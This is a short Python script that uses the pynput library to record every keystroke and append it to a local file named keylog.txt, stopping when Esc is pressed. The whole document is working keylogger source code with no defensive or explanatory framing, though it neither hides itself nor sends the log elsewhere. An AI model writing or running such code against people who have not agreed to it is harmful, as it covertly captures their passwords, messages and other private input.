from pynput import keyboard

# Path to the log file
log_file = "keylog.txt"

# Function to log the keys to a file
def log_key(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == key.space:
                f.write(" ")
            else:
                f.write(f" {key} ")

# Function to handle key release events
def on_key_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Create a listener for keyboard events
with keyboard.Listener(on_press=log_key, on_release=on_key_release) as listener:
    listener.join()
